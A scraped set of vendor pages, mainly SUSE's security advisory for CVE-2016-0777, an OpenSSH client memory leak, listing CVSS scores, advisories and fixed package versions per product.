 remove it once the upgrade is complete and nothing depends on it.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from h20566.www2.hpe.com_821960e7_20250125_234746.html ===


[**Support Center**](/connect/s/)



=== Content from kb.juniper.net_268ab2f2_20250125_234712.html ===
Loading×Sorry to interruptCSS ErrorRefresh

=== Content from www.suse.com_23c86db2_20250126_125239.html ===

![](/assets/img/1px-transparent.gif)
![](/assets/img/1px-transparent.gif)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)
![SUSE Federal Logo](https://www.suse.com/assets/img/fed_logo.png)](https://www.suse.com)
Exit SUSE Federal  >

[Customer Center](https://scc.suse.com/home)

Account

Hello
[Update Your Account](https://www.suse.com/account/update/)
[Log Out](https://www.suse.com/saml2/logout/)

[Login](https://www.suse.com/saml2/login/)
[Create Account](https://www.suse.com/account/create/)
[Update Your Account](https://www.suse.com/account/update/)

English

Language
[Deutsch](https://www.suse.com/de-de/security/cve/CVE-2016-0777.html)
[English](https://www.suse.com/security/cve/CVE-2016-0777.html)
[EspaÃ±ol](https://www.suse.com/es-es/security/cve/CVE-2016-0777.html)
[FranÃ§ais](https://www.suse.com/fr-fr/security/cve/CVE-2016-0777.html)
[ä¸­æ(ç®ä½)](https://www.suse.com/zh-cn/security/cve/CVE-2016-0777.html)
[æ¥æ¬èª](https://www.suse.com/ja-jp/security/cve/CVE-2016-0777.html)
[íêµ­ì´](https://www.suse.com/ko-kr/security/cve/CVE-2016-0777.html)
[PortuguÃªs (Brasil)](https://www.suse.com/pt-br/security/cve/CVE-2016-0777.html)

[Shop](https://www.suse.com/shop/)

[View Cart](https://buy.suse.com/store?Action=DisplayPage&Env=BASE&SiteID=suse&id=ThreePgCheckoutShoppingCartPage)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)](https://www.suse.com)
Exit SUSE Federal  >

[Shop](https://www.suse.com/shop/)
[SUSECON 25](https://www.suse.com/susecon/)
[Customer](https://scc.suse.com/home)

Federal Solutions

Products

Solutions

Support

Partners

Communities

About

[Contact Us](https://www.suse.com/contact/)

[Free Downloads](https://www.suse.com/products/)

 Back

 Back
[![Icon](https://www.suse.com/assets/img/icons/Linux-one-color.svg)
Linux](https://www.suse.com/solutions/business-critical-linux/ "Linux")

* [SUSE Linux Enterprise Server](https://www.suse.com/products/server/)
* [SUSE Linux Enterprise Server

  for SAP Applications](https://www.suse.com/products/sles-for-sap/)
* [SUSE Linux Micro](https://www.suse.com/products/micro/)
* [SUSE Multi-Linux Support](https://www.suse.com/products/multi-linux-support/)
* [SUSE Multi-Linux Manager](https://www.suse.com/products/multi-linux-manager/)

[![Icon](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)
Cloud Native](https://www.suse.com/solutions/enterprise-container-management/ "Cloud Native")

* [SUSE Rancher Prime](https://www.suse.com/products/rancher/)
* [Virtualization (Harvester)](https://www.suse.com/products/rancher/virtualization/)
* [Storage (Longhorn)](https://www.suse.com/products/rancher/storage/)
* [Security (NeuVector)](https://www.suse.com/products/rancher/security/)
* [Observability](https://www.suse.com/solutions/observability/)
* [SUSE Cloud Observability](https://www.suse.com/products/cloud/observability/)

[![Icon](https://www.suse.com/assets/img/icons/Edge-one-color.svg)
Edge](https://www.suse.com/solutions/edge-computing/ "Edge")

* [SUSE Edge](https://www.suse.com/products/edge/)
* [SUSE Edge for Telco](https://www.suse.com/products/edge-for-telco/)

[![Icon](https://www.suse.com/assets/img/icons/AI-one-color.svg)
AI](https://www.suse.com/solutions/edge-computing/ "AI")

* [SUSE AI](https://www.suse.com/products/ai/)

[All Products](https://www.suse.com/products/)

 Back
Foundational

* [![Linux](https://www.suse.com/assets/img/icons/Linux-one-color.svg)](https://www.suse.com/solutions/linux/)
* [![Cloud Native](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)](https://www.suse.com/solutions/cloud-native/)
* [![Edge](https://www.suse.com/assets/img/icons/Edge-one-color.svg)](https://www.suse.com/solutions/edge/)
* [![AI](https://www.suse.com/assets/img/icons/AI-one-color.svg)](https://www.suse.com/solutions/ai/)

Solutions

* [Run SAP

  Run & secure cloud and on-prem workloads](https://www.suse.com/solutions/run-sap-solutions/)
* [Public Cloud

  Accelerate and innovate across your cloud environment](https://www.suse.com/solutions/public-cloud/)
* [Observability

  Rapid, full-stack visibility in under 5 minutes](https://www.suse.com/solutions/observability/)
* [Security

  Secure your digital enterprise](https://www.suse.com/solutions/security/)

Industries

* [Automotive](https://www.suse.com/sector/automotive/)
* [Telecom](https://www.suse.com/sector/telco/)
* [Banking and Financial Systems](https://www.suse.com/sector/banking-financial-services/)
* [Healthcare](https://www.suse.com/sector/healthcare/)
* [Manufacturing](https://www.suse.com/sector/manufacturing/)
* [Retail](https://www.suse.com/sector/retail/)
* [Technology & Software](https://www.suse.com/sector/technology/)
* [Federal](https://www.ranchergovernment.com/)
* [Pharma](https://www.suse.com/sector/pharma/)
* [Energy](https://www.suse.com/sector/energy/)

 Back
Support

* [Product Support

  SUSE Customer Center](https://scc.suse.com/home)
* [Premium Support Services

  Dedicated support services from a premium team](https://www.suse.com/services/premium/)
* [Long Term Services Support

  Stay on your existing product version](https://www.suse.com/products/long-term-service-pack-support/)
* [Renew Your Support Subscription

  Partners with cloud providers](https://www.suse.com/renewals/)
* [![AWS](https://www.suse.com/assets/img/icons/320px-Amazon3.svg)](https://aws.amazon.com/marketplace/search/results?searchTerms=suse)
* [![Microsoft Azure](https://www.suse.com/assets/img/icons/Microsoft_Azure3.svg)](https://azure.microsoft.com/solutions/linux-on-azure/suse/)
* [![Google](https://www.suse.com/assets/img/icons/lockup_GoogleCloud_FullColor_rgb_139x24px 1.svg)](https://console.cloud.google.com/marketplace/browse?q=SUSE)

Services

* [Consulting Services](https://www.suse.com/services/)
* [Training & Certification](https://www.suse.com/training/)
* [Premium Technical Advisory Services](https://www.suse.com/services/premium-technical-advisory/)

Resources

* [SUSE Support User Guide](https://www.suse.com/support/handbook/)
* [Patches & Updates](https://download.suse.com/patch/finder/)
* [Product Documentation](https://documentation.suse.com/)
* [Knowledgebase](https://www.suse.com/support/kb/)
* [Product Support Life Cycle](https://www.suse.com/lifecycle/)
* [Package Hub

  Community packages for SUSE Linux Enterprise Server](https://packagehub.suse.com/)
* [Driver Search](https://drivers.suse.com/)
* [Support Forums](https://forums.suse.com/forum.php)
* [Developer Services](https://www.suse.com/services/support-offerings/developer-services/)
* [Beta Program](https://www.suse.com/betaprogram/)
* [Security](https://www.suse.com/support/security/)

 Back
Partners

* [Partner Program](https://www.suse.com/partners/)
* [Find a Partner](https://www.suse.com/partners/find-partner/)
* [Become a Partner](https://www.suse.com/partners/become-partner/)
* [Login to the SUSE Partner Portal](https://partner.suse.com/)

 Back
Communities

* [Blog](https://www.suse.com/c/blog/)
* [Forum](https://forums.suse.com/forum.php)
* [Open Source Projects](http://opensource.suse.com/)
* [openSUSE.org](https://www.opensuse.org/)

 Back
About

* [About](https://www.suse.com/company/about/)
* [Leadership](https://www.suse.com/leadership/)
* [Careers](https://jobs.suse.com/)
* [Newsroom](https://www.suse.com/news/)
* [Success Stories](https://www.suse.com/success/)
* [Investor Relations](https://ir.suse.com/)
* [Social Impact](https://www.suse.com/esg/)
* [SUSE Logo and Brand](https://brand.suse.com/)
* [Events](https://www.suse.com/events/)
* [Merchandise Store](https://www.susemerchandise.com/)

# CVE-2016-0777

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2016-0775.html) [[Index]](index.html) [[Next]](CVE-2016-0778.html)

### Upstream information

[CVE-2016-0777 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0777)

#### Description

The resend\_bytes function in roaming\_common.c in the client in OpenSSH 5.x, 6.x, and 7.x before 7.1p2 allows remote servers to obtain sensitive information from process memory by requesting transmission of an entire buffer, as demonstrated by reading a private key.

---

### [SUSE information](https://www.suse.com/c/cve-pages-self-help-security-issues-suse-linux-enterprise/)

Overall state of this security issue: Resolved

This issue is currently rated as having [critical](https://www.suse.com/support/security/rating/) severity.

[CVSS v2 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database |
| Base Score | 4 |
| Vector | AV:N/AC:L/Au:S/C:P/I:N/A:N |
| Access Vector | Network |
| Access Complexity | Low |
| Authentication | Single |
| Confidentiality Impact | Partial |
| Integrity Impact | None |
| Availability Impact | None |

[CVSS v3 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database |
| Base Score | 6.5 |
| Vector | CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | Low |
| User Interaction | None |
| Scope | Unchanged |
| Confidentiality Impact | High |
| Integrity Impact | None |
| Availability Impact | None |
| CVSSv3 Version | 3 |

#### Note from the SUSE Security Team

This issue affects only the openssh client in openssh 5.4 and later versions. Older openssh versions are not affected.SUSE Bugzilla entries: [961642](https://bugzilla.suse.com/show_bug.cgi?id=961642) [RESOLVED / FIXED], [996040](https://bugzilla.suse.com/show_bug.cgi?id=996040) [RESOLVED / FIXED]
### SUSE Security Advisories:

* [SUSE-SU-2016:0117-1](https://lists.suse.com/pipermail/sle-security-updates/2016-January/001802.html), published Thu Jan 14 12:11:30 MST 2016
* [SUSE-SU-2016:0118-1](https://lists.suse.com/pipermail/sle-security-updates/2016-January/001803.html), published Thu Jan 14 12:12:08 MST 2016
* [SUSE-SU-2016:0119-1](https://lists.suse.com/pipermail/sle-security-updates/2016-January/001804.html), published Thu Jan 14 12:12:45 MST 2016
* [SUSE-SU-2016:0120-1](https://lists.suse.com/pipermail/sle-security-updates/2016-January/001805.html), published Thu Jan 14 12:13:21 MST 2016
* [TID7017154](https://www.suse.com/support/kb/doc?id=7017154), published Fri Jan 15 01:09:20 CET 2016
* [TID7017155](https://www.suse.com/support/kb/doc?id=7017155), published Fri Jan 15 01:09:18 CET 2016
* [TID7017180](https://www.suse.com/support/kb/doc/?id=7017180), published Sa 3. MÃ¤r 12:03:46 CET 2018
* [openSUSE-SU-2016:0127-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/R7FZXC627WBJIDCDZEYQLLMKYOCLGTH2/#R7FZXC627WBJIDCDZEYQLLMKYOCLGTH2), published Fri Dec 8 15:48:34 2023
* [openSUSE-SU-2016:0128-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/KG22AHWOUP3O2CQJXLG3TPW4BOFPPN5Q/#KG22AHWOUP3O2CQJXLG3TPW4BOFPPN5Q), published Fri Dec 8 15:48:34 2023
* [openSUSE-SU-2016:0144-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/SKEQIBI4FAQSK2KSGNHUDTP6IFNW72I3/#SKEQIBI4FAQSK2KSGNHUDTP6IFNW72I3), published Fri Dec 8 15:48:34 2023
* [openSUSE-SU-2016:0145-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/ZQX4IUCQNLQ6M7HK5P6KRSV2TQWA4FTF/#ZQX4IUCQNLQ6M7HK5P6KRSV2TQWA4FTF), published Fri Dec 8 15:48:34 2023

### List of released packages

| Product(s) | Fixed package version(s) | References |
| --- | --- | --- |
| SUSE Enterprise Storage 6 SUSE Linux Enterprise High Performance Computing 15 SP1 SUSE Linux Enterprise Server 15 SP1 SUSE Linux Enterprise Server for SAP Applications 15 SP1 SUSE Manager Proxy 4.0 SUSE Manager Retail Branch Server 4.0 SUSE Manager Server 4.0 | * `openssh >= 7.9p1-4.7` * `openssh-fips >= 7.9p1-4.7` * `openssh-helpers >= 7.9p1-4.7` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP1 GA openssh-7.9p1-4.7SUSE Linux Enterprise Module for Server Applications 15 SP1 GA openssh-fips-7.9p1-4.7 |
| SUSE Enterprise Storage 7.1 SUSE Linux Enterprise High Performance Computing 15 SP3 SUSE Linux Enterprise Server 15 SP3 SUSE Linux Enterprise Server for SAP Applications 15 SP3 SUSE Manager Proxy 4.2 SUSE Manager Retail Branch Server 4.2 SUSE Manager Server 4.2 | * `openssh >= 8.4p1-1.30` * `openssh-clients >= 8.4p1-1.30` * `openssh-common >= 8.4p1-1.30` * `openssh-fips >= 8.4p1-1.30` * `openssh-helpers >= 8.4p1-1.30` * `openssh-server >= 8.4p1-1.30` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP3 GA openssh-8.4p1-1.30SUSE Linux Enterprise Module for Server Applications 15 SP3 GA openssh-fips-8.4p1-1.30 |
| SUSE Enterprise Storage 7 SUSE Linux Enterprise High Performance Computing 15 SP2 SUSE Linux Enterprise Server 15 SP2 SUSE Linux Enterprise Server for SAP Applications 15 SP2 SUSE Manager Proxy 4.1 SUSE Manager Retail Branch Server 4.1 SUSE Manager Server 4.1 | * `openssh >= 8.1p1-3.21` * `openssh-fips >= 8.1p1-3.21` * `openssh-helpers >= 8.1p1-3.21` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP2 GA openssh-8.1p1-3.21SUSE Linux Enterprise Module for Server Applications 15 SP2 GA openssh-fips-8.1p1-3.21 |
| SUSE Liberty Linux 7 | * `openssh >= 6.6.1p1-23.el7_2` * `openssh-askpass >= 6.6.1p1-23.el7_2` * `openssh-clients >= 6.6.1p1-23.el7_2` * `openssh-keycat >= 6.6.1p1-23.el7_2` * `openssh-ldap >= 6.6.1p1-23.el7_2` * `openssh-server >= 6.6.1p1-23.el7_2` * `openssh-server-sysvinit >= 6.6.1p1-23.el7_2` * `pam_ssh_agent_auth >= 0.9.3-9.23.el7_2` | Patchnames: RHSA-2016:0043 |
| SUSE Linux Enterprise Desktop 11 SP3 | * `openssh >= 6.2p2-0.24.1` * `openssh-askpass >= 6.2p2-0.24.1` * `openssh-askpass-gnome >= 6.2p2-0.24.3` | Patchnames: sledsp3-openssh-2016011301-12325 |
| SUSE Linux Enterprise Desktop 11 SP4 | * `openssh >= 6.6p1-16.1` * `openssh-askpass-gnome >= 6.6p1-16.4` * `openssh-helpers >= 6.6p1-16.1` | Patchnames: sledsp4-openssh-2016011302-12326 |
| SUSE Linux Enterprise Desktop 12 SP1 | * `openssh >= 6.6p1-33.1` * `openssh-askpass-gnome >= 6.6p1-33.1` * `openssh-helpers >= 6.6p1-33.1` | Patchnames: SUSE-SLE-DESKTOP-12-SP1-2016-85 |
| SUSE Linux Enterprise Desktop 12 SP2 | * `openssh >= 7.2p2-55.1` * `openssh-helpers >= 7.2p2-55.1` | Patchnames: SUSE Linux Enterprise Desktop 12 SP2 GA openssh-7.2p2-55.1 |
| SUSE Linux Enterprise Desktop 12 SP3 | * `openssh >= 7.2p2-69.1` * `openssh-helpers >= 7.2p2-69.1` | Patchnames: SUSE Linux Enterprise Desktop 12 SP3 GA openssh-7.2p2-69.1 |
| SUSE Linux Enterprise Desktop 12 SP4 | * `openssh >= 7.2p2-74.25.1` * `openssh-helpers >= 7.2p2-74.25.1` | Patchnames: SUSE Linux Enterprise Desktop 12 SP4 GA openssh-7.2p2-74.25.1 |
| SUSE Linux Enterprise Desktop 12 | * `openssh >= 6.6p1-33.1` * `openssh-askpass-gnome >= 6.6p1-33.1` * `openssh-helpers >= 6.6p1-33.1` | Patchnames: SUSE-SLE-DESKTOP-12-2016-85 |
| SUSE Linux Enterprise Desktop 15 SP1 SUSE Linux Enterprise Module for Basesystem 15 SP1 | * `openssh >= 7.9p1-4.7` * `openssh-helpers >= 7.9p1-4.7` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP1 GA openssh-7.9p1-4.7 |
| SUSE Linux Enterprise Desktop 15 SP2 SUSE Linux Enterprise Module for Basesystem 15 SP2 | * `openssh >= 8.1p1-3.21` * `openssh-helpers >= 8.1p1-3.21` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP2 GA openssh-8.1p1-3.21 |
| SUSE Linux Enterprise Desktop 15 SP3 SUSE Linux Enterprise Module for Basesystem 15 SP3 | * `openssh >= 8.4p1-1.30` * `openssh-clients >= 8.4p1-1.30` * `openssh-common >= 8.4p1-1.30` * `openssh-helpers >= 8.4p1-1.30` * `openssh-server >= 8.4p1-1.30` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP3 GA openssh-8.4p1-1.30 |
| SUSE Linux Enterprise Desktop 15 SP4 SUSE Linux Enterprise High Performance Computing 15 SP4 SUSE Linux Enterprise Module for Basesystem 15 SP4 SUSE Linux Enterprise Server 15 SP4 SUSE Linux Enterprise Server for SAP Applications 15 SP4 SUSE Manager Proxy 4.3 SUSE Manager Retail Branch Server 4.3 SUSE Manager Server 4.3 | * `openssh >= 8.4p1-3.9.1` * `openssh-clients >= 8.4p1-3.9.1` * `openssh-common >= 8.4p1-3.9.1` * `openssh-fips >= 8.4p1-3.9.1` * `openssh-helpers >= 8.4p1-3.9.1` * `openssh-server >= 8.4p1-3.9.1` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP4 GA openssh-8.4p1-3.9.1 |
| SUSE Linux Enterprise Desktop 15 SP5 SUSE Linux Enterprise High Performance Computing 15 SP5 SUSE Linux Enterprise Module for Basesystem 15 SP5 SUSE Linux Enterprise Server 15 SP5 SUSE Linux Enterprise Server for SAP Applications 15 SP5 | * `openssh >= 8.4p1-150300.3.18.2` * `openssh-clients >= 8.4p1-150300.3.18.2` * `openssh-common >= 8.4p1-150300.3.18.2` * `openssh-fips >= 8.4p1-150300.3.18.2` * `openssh-helpers >= 8.4p1-150300.3.18.2` * `openssh-server >= 8.4p1-150300.3.18.2` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP5 GA openssh-8.4p1-150300.3.18.2 |
| SUSE Linux Enterprise Desktop 15 SP6 SUSE Linux Enterprise High Performance Computing 15 SP6 SUSE Linux Enterprise Module for Basesystem 15 SP6 SUSE Linux Enterprise Server 15 SP6 SUSE Linux Enterprise Server for SAP Applications 15 SP6 | * `openssh >= 9.6p1-150600.4.2` * `openssh-clients >= 9.6p1-150600.4.2` * `openssh-common >= 9.6p1-150600.4.2` * `openssh-fips >= 9.6p1-150600.4.2` * `openssh-helpers >= 9.6p1-150600.4.2` * `openssh-server >= 9.6p1-150600.4.2` * `openssh-server-config-disallow-rootlogin >= 9.6p1-150600.4.2` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP6 GA openssh-9.6p1-150600.4.2 |
| SUSE Linux Enterprise Desktop 15 SUSE Linux Enterprise Module for Basesystem 15 | * `openssh >= 7.6p1-7.8` * `openssh-helpers >= 7.6p1-7.8` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 GA openssh-7.6p1-7.8 |
| SUSE Linux Enterprise High Performance Computing 12 SP5 | * `openssh >= 7.2p2-74.45.1` * `openssh-fips >= 7.2p2-74.45.1` * `openssh-helpers >= 7.2p2-74.45.1` | Patchnames: SUSE Linux Enterprise High Performance Computing 12 SP5 GA openssh-7.2p2-74.45.1 |
| SUSE Linux Enterprise High Performance Computing 15 SUSE Linux Enterprise Server 15 SUSE Linux Enterprise Server for SAP Applications 15 | * `openssh >= 7.6p1-7.8` * `openssh-fips >= 7.6p1-7.8` * `openssh-helpers >= 7.6p1-7.8` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 GA openssh-7.6p1-7.8SUSE Linux Enterprise Module for Server Applications 15 GA openssh-fips-7.6p1-7.8 |
| SUSE Linux Enterprise Micro 5.0 | * `openssh >= 8.1p1-5.12.3` | Patchnames: SUSE Linux Enterprise Micro 5.0 GA openssh-8.1p1-5.12.3 |
| SUSE Linux Enterprise Micro 5.1 | * `openssh >= 8.4p1-3.3.1` * `openssh-clients >= 8.4p1-3.3.1` * `openssh-common >= 8.4p1-3.3.1` * `openssh-fips >= 8.4p1-3.3.1` * `openssh-server >= 8.4p1-3.3.1` | Patchnames: SUSE Linux Enterprise Micro 5.1 GA openssh-8.4p1-3.3.1 |
| SUSE Linux Enterprise Micro 5.2 | * `openssh >= 8.4p1-3.9.1` * `openssh-clients >= 8.4p1-3.9.1` * `openssh-common >= 8.4p1-3.9.1` * `openssh-fips >= 8.4p1-3.9.1` * `openssh-server >= 8.4p1-3.9.1` | Patchnames: SUSE Linux Enterprise Micro 5.2 GA openssh-8.4p1-3.9.1 |
| SUSE Linux Enterprise Micro 5.3 | * `openssh >= 8.4p1-3.9.1` * `openssh-clients >= 8.4p1-3.9.1` * `openssh-common >= 8.4p1-3.9.1` * `openssh-fips >= 8.4p1-3.9.1` * `openssh-server >= 8.4p1-3.9.1` | Patchnames: SUSE Linux Enterprise Micro 5.3 GA openssh-8.4p1-3.9.1 |
| SUSE Linux Enterprise Micro 5.4 | * `openssh >= 8.4p1-150300.3.15.4` * `openssh-clients >= 8.4p1-150300.3.15.4` * `openssh-common >= 8.4p1-150300.3.15.4` * `openssh-fips >= 8.4p1-150300.3.15.4` * `openssh-server >= 8.4p1-150300.3.15.4` | Patchnames: SUSE Linux Enterprise Micro 5.4 GA openssh-8.4p1-150300.3.15.4 |
| SUSE Linux Enterprise Module for Server Applications 15 SP1 | * `openssh-fips >= 7.9p1-4.7` | Patchnames: SUSE Linux Enterprise Module for Server Applications 15 SP1 GA openssh-fips-7.9p1-4.7 |
| SUSE Linux Enterprise Module for Server Applications 15 SP2 | * `openssh-fips >= 8.1p1-3.21` | Patchnames: SUSE Linux Enterprise Module for Server Applications 15 SP2 GA openssh-fips-8.1p1-3.21 |
| SUSE Linux Enterprise Module for Server Applications 15 SP3 | * `openssh-fips >= 8.4p1-1.30` | Patchnames: SUSE Linux Enterprise Module for Server Applications 15 SP3 GA openssh-fips-8.4p1-1.30 |
| SUSE Linux Enterprise Module for Server Applications 15 | * `openssh-fips >= 7.6p1-7.8` | Patchnames: SUSE Linux Enterprise Module for Server Applications 15 GA openssh-fips-7.6p1-7.8 |
| SUSE Linux Enterprise Server 11 SP3 SUSE Linux Enterprise Server for SAP Applications 11 SP3 | * `openssh >= 6.2p2-0.24.1` * `openssh-askpass >= 6.2p2-0.24.1` * `openssh-askpass-gnome >= 6.2p2-0.24.3` | Patchnames: slessp3-openssh-2016011301-12325 |
| SUSE Linux Enterprise Server 11 SP4 SUSE Linux Enterprise Server for SAP Applications 11 SP4 | * `openssh >= 6.6p1-16.1` * `openssh-askpass-gnome >= 6.6p1-16.4` * `openssh-fips >= 6.6p1-16.1` * `openssh-helpers >= 6.6p1-16.1` | Patchnames: slessp4-openssh-2016011302-12326 |
| SUSE Linux Enterprise Server 11-SECURITY | * `openssh-openssl1 >= 6.6p1-10.1` * `openssh-openssl1-helpers >= 6.6p1-10.1` | Patchnames: SUSE Linux Enterprise Server 11-SECURITY GA openssh-openssl1-6.6p1-10.1secsp3-openssh-openssl1-12327 |
| SUSE Linux Enterprise Server 12 SP1 SUSE Linux Enterprise Server for SAP Applications 12 SP1 | * `openssh >= 6.6p1-33.1` * `openssh-askpass-gnome >= 6.6p1-33.1` * `openssh-fips >= 6.6p1-33.1` * `openssh-helpers >= 6.6p1-33.1` | Patchnames: SUSE-SLE-SERVER-12-SP1-2016-85 |
| SUSE Linux Enterprise Server 12 SP2 | * `openssh >= 7.2p2-55.1` * `openssh-fips >= 7.2p2-55.1` * `openssh-helpers >= 7.2p2-55.1` | Patchnames: SUSE Linux Enterprise Server 12 SP2 GA openssh-7.2p2-55.1 |
| SUSE Linux Enterprise Server 12 SP3 | * `openssh >= 7.2p2-69.1` * `openssh-fips >= 7.2p2-69.1` * `openssh-helpers >= 7.2p2-69.1` | Patchnames: SUSE Linux Enterprise Server 12 SP3 GA openssh-7.2p2-69.1 |
| SUSE Linux Enterprise Server 12 SP4 | * `openssh >= 7.2p2-74.25.1` * `openssh-fips >= 7.2p2-74.25.1` * `openssh-helpers >= 7.2p2-74.25.1` | Patchnames: SUSE Linux Enterprise Server 12 SP4 GA openssh-7.2p2-74.25.1 |
| SUSE Linux Enterprise Server 12 SP5 | * `openssh >= 7.2p2-74.45.1` * `openssh-fips >= 7.2p2-74.45.1` * `openssh-helpers >= 7.2p2-74.45.1` | Patchnames: SUSE Linux Enterprise Server 12 SP5 GA openssh-7.2p2-74.45.1 |
| SUSE Linux Enterprise Server 12 SUSE Linux Enterprise Server for SAP Applications 12 | * `openssh >= 6.6p1-33.1` * `openssh-askpass-gnome >= 6.6p1-33.1` * `openssh-fips >= 6.6p1-33.1` * `openssh-helpers >= 6.6p1-33.1` | Patchnames: SUSE-SLE-SERVER-12-2016-85 |
| SUSE Linux Enterprise Server for Raspberry Pi 12 SP2 | * `openssh >= 7.2p2-55.1` * `openssh-fips >= 7.2p2-55.1` * `openssh-helpers >= 7.2p2-55.1` | Patchnames: SUSE Linux Enterprise Server for Raspberry Pi 12 SP2 GA openssh-7.2p2-55.1 |
| SUSE Linux Micro 6.0 | * `openssh >= 9.6p1-1.4` * `openssh-clients >= 9.6p1-1.4` * `openssh-common >= 9.6p1-1.4` * `openssh-fips >= 9.6p1-1.4` * `openssh-server >= 9.6p1-1.4` * `openssh-server-config-rootlogin >= 9.6p1-1.4` | Patchnames: SUSE Linux Micro 6.0 GA openssh-9.6p1-1.4 |
| SUSE Linux Micro 6.1 | * `openssh >= 9.6p1-slfo.1.1_1.6` * `openssh-clients >= 9.6p1-slfo.1.1_1.6` * `openssh-common >= 9.6p1-slfo.1.1_1.6` * `openssh-fips >= 9.6p1-slfo.1.1_1.6` * `openssh-server >= 9.6p1-slfo.1.1_1.6` * `openssh-server-config-rootlogin >= 9.6p1-slfo.1.1_1.6` | Patchnames: SUSE Linux Micro 6.1 GA openssh-9.6p1-slfo.1.1\_1.6 |
| openSUSE Leap 15.0 | * `openssh >= 7.6p1-lp150.7.4` * `openssh-helpers >= 7.6p1-lp150.7.4` | Patchnames: openSUSE Leap 15.0 GA openssh-7.6p1-lp150.7.4 |
| openSUSE Leap 15.2 | * `openssh >= 8.1p1-lp152.3.2` * `openssh-helpers >= 8.1p1-lp152.3.2` | Patchnames: openSUSE Leap 15.2 GA openssh-8.1p1-lp152.3.18 |
| openSUSE Leap 15.3 | * `openssh >= 8.4p1-1.30` * `openssh-clients >= 8.4p1-1.30` * `openssh-common >= 8.4p1-1.30` * `openssh-server >= 8.4p1-1.30` | Patchnames: openSUSE Leap 15.3 GA openssh-8.4p1-1.30 |
| openSUSE Leap 15.4 | * `openssh >= 8.4p1-3.9.1` * `openssh-clients >= 8.4p1-3.9.1` * `openssh-common >= 8.4p1-3.9.1` * `openssh-server >= 8.4p1-3.9.1` | Patchnames: openSUSE Leap 15.4 GA openssh-8.4p1-3.9.1 |
| openSUSE Tumbleweed | * `openssh >= 7.2p2-3.1` * `openssh-cavs >= 7.2p2-3.1` * `openssh-fips >= 7.2p2-3.1` * `openssh-helpers >= 7.2p2-3.1` | Patchnames: openSUSE-Tumbleweed-2024-10174 |

---

### First public cloud image revisions this CVE is fixed in:

* [alibaba/sles-15-sp3-chost-byos-v20210729](https://publiccloudimagechangeinfo.suse.com/alibaba/sles-15-sp3-chost-byos-v20210729)
* [alibaba/sles-15-sp3-chost-byos-v20210827](https://publiccloudimagechangeinfo.suse.com/alibaba/sles-15-sp3-chost-byos-v20210827)
* [amazon/suse-manager-4-2-proxy-byos-v20210924-hvm-ssd-x86\_64](https://publiccloudimagechangeinfo.suse.com/amazon/suse-manager-4-2-proxy-byos-v20210924-hvm-ssd-x86_64)
* [amazon/suse-manager-4-2-server-byos-v20210924-hvm-ssd-x86\_64](https://publiccloudimagechangeinfo.suse.com/amazon/suse-manager-4-2-server-byos-v20210924-hvm-ssd-x86_64)
* [amazon/suse-sles-15-sp3-byos-v20210924-hvm-ssd-arm64](https://publiccloudimagechangeinfo.suse.com/amazon/suse-sles-15-sp3-byos-v20210924-hvm-ssd-arm64)
* [amazon/suse-sles-15-sp3-byos-v20210924-hvm-ssd-x86\_64](https://publiccloudimagechangeinfo.suse.com/amazon/suse-sles-15-sp3-byos-v20210924-hvm-ssd-x86_64)
* [amazon/suse-sles-15-sp3-chost-byos-v20210729-hvm-ssd-x86\_64](https://publiccloudimagechangeinfo.suse.com/amazon/suse-sles-15-sp3-chost-byos-v20210729-hvm-ssd-x86_64)
* [amazon/suse-sles-15-sp3-chost-byos-v20210827-hvm-ssd-x86\_64](https://publiccloudimagechangeinfo.suse.com/amazon/suse-sles-15-sp3-chost-byos-v20210827-hvm-ssd-x86_64)
* [amazon/suse-sles-15-sp3-v20210924-ecs-hvm-ssd-x86\_64](https://publiccloudimagechangeinfo.suse.com/amazon/suse-sles-15-sp3-v20210924-ecs-hvm-ssd-x86_64)
* [amazon/suse-sles-15-sp3-v20210924-hvm-ssd-arm64](https://publiccloudimagechangeinfo.suse.com/amazon/suse-sles-15-sp3-v20210924-hvm-ssd-arm64)
* [amazon/suse-sles-15-sp3-v20210924-hvm-ssd-x86\_64](https://publiccloudimagechangeinfo.suse.com/amazon/suse-sles-15-sp3-v20210924-hvm-ssd-x86_64)
* [amazon/suse-sles-hpc-15-sp3-byos-v20210924-hvm-ssd-x86\_64](https://publiccloudimagechangeinfo.suse.com/amazon/suse-sles-hpc-15-sp3-byos-v20210924-hvm-ssd-x86_64)
